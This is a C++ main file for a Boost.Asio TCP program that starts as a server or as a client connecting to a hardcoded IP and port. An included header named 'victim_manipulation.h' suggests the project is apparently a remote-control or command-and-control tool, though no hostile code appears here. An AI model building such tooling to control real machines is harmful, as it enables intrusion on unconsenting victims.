#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <iostream>
#include <ostream>
#include <string>

#include "server.h"
#include "client.h"
#include "thread_pool.h"
#include "victim_manipulation.h"


#define PORT_NUMBER 2772
#define SERVER_IP "1.1.1.1"

namespace io = boost::asio;


int main(int argc, char* argv[]) {

    if (argc < 2) {
        std::cout << "Mode of execution [server/client] is not specified" << std::endl
                  << "Exiting..." << std::endl;
        std::exit(1);
    }

    if (std::string(argv[1]) == "server") {

        std::cout << "Running as server" << std::endl;
        io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
        server tcp_server(io_context, PORT_NUMBER);
        tcp_server.start();
        io_context.run();

    } else if (std::string(argv[1]) == "client") {

        io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
        client client_tcp(io_context, PORT_NUMBER, SERVER_IP);
        client_tcp.start();
        io_context.run();

    }

    return 0;
}